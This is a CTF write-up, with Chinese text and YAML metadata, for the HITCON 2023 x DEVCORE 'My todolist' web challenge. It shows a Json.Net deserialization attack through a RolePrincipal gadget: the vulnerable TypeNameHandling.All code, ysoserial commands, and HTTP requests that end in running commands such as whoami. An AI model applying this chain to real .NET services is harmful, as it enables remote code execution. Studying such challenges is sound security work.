---
title: HITCON 2023 x DEVCORE Wargame: My todolist Write-up
contest: HITCON 2023 x DEVCORE Wargame
year: 2023
difficulty: hard
vuln_type: web_unknown
tags: [web, json-net, typename-all, role-principal, ysoserial, process-start, dotnet-deserialize]
attack_chain:
  - TypeNameHandling=All + MetadataPropertyHandling=ReadAhead
  - 第一个$type控制target类型
  - 第二个$type指定RolePrincipal gadget
  - Process.StartInfo执行 /c calc命令
  - ysoserial.exe -g RolePrincipal -f Json.Net
  - --bgc ActivitySurrogateDisableTypeCheck -c 1
  - POST /Api/UpdateTodo 设置uuid+field=value
  - POST /Api/MyProfile 触发命令执行cmd=whoami
key_payload: $type=System.Web.Security.RolePrincipal + Process.StartInfo /c calc
one_liner: HITCON 2023 Wargame My todolist：Json.Net反序列化+RolePrincipal+Process.Start
lesson: Json.Net TypeNameHandling=All配合RolePrincipal gadget可RCE
quality: high
---

# HITCON 2023 x DEVCORE Wargame: My todolist Write-up

## 题目信息
- 比赛：HITCON 2023 x DEVCORE Wargame
- 题目：My todolist
- 类别：Web（.NET 反序列化）

## 关键攻击链
### 1. Json.Net 反序列化
```csharp
public static T Clone<T>(this T source) {
    JsonSerializerSettings settings = new JsonSerializerSettings() {
        TypeNameHandling = TypeNameHandling.All
    };
    return (T) JsonConvert.DeserializeObject(JsonConvert.SerializeObject(source, settings), settings);
}
```

### 2. 双 $type gadget
```json
{
    "$type": "System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib",
    "$type": "System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
}
```

### 3. ysoserial 生成
```bash
ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateDisableTypeCheck -c 1
ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateSelectorFromFile -c ".\ExploitClass.cs;dlls\System.dll;dlls\System.Web.dll"
```

### 4. Process StartInfo
```xml
<ProcessStartInfo Arguments="/c calc" ... FileName="cmd" />
```

### 5. HTTP 攻击
```http
POST /Api/UpdateTodo HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: <session>

uuid=00c3abe9-1f7c-4cda-8c24-60c59ac01f3f&field=$type&value=System.Web.Security.RolePrincipal,+System.Web,+Version%3d4.0.0.0,+Culture%3dneutral,+PublicKeyToken%3db03f5f7f11d50a3a
```

```http
POST /Api/UpdateTodo HTTP/1.1

uuid=00c3abe9-1f7c-4cda-8c24-60c59ac01f3f&field=System.Security.ClaimsPrincipal.Identities&value=AAEAAAD/////...
```

```http
POST /Api/MyProfile HTTP/1.1

cmd=whoami
```

## 评分
- quality: high（Json.Net 反序列化 + RolePrincipal gadget + ysoserial 完整攻击链）
